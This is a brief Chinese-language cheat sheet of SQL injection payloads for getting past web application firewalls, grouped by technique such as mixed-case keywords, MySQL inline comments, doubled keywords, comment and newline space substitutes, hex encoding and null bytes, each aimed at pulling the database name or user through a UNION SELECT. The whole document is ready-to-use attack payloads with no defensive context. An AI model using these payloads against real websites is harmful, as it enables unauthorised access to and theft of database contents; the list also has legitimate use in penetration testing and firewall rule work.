# SQL注入WAF绕过

## 大小写混淆

```sql
' UnIoN SeLeCt 1,database(),3--
' uNiOn SeLeCt 1,user(),3--
```

## 内联注释

```sql
' /*!UNION*/ /*!SELECT*/ 1,database(),3--
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
```

## 双写绕过

```sql
' UNUNIONION SELSELECTECT 1,database(),3--
' UNIunionON SELselectECT 1,2,3--
```

## 空格替代

```sql
'/**/UNION/**/SELECT/**/1,database(),3--
' %0aUNION%0aSELECT%0a1,2,3--
'(UNION(SELECT(1),(database()),(3)))--
```

## 编码绕过

```sql
' UNION SELECT 1,hex(database()),3--
' UNION SELECT 1,unhex(hex(database())),3--
' UNION SELECT 1,conv(hex(database()),16,10),3--
```

## 特殊字符

```sql
' UNI/**/ON SEL/**/ECT 1,2,3--
' UN%00ION SELECT 1,2,3--
```

## 数字绕过

```sql
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3e0--
' UNION SELECT 1,0x2,0x3--
```
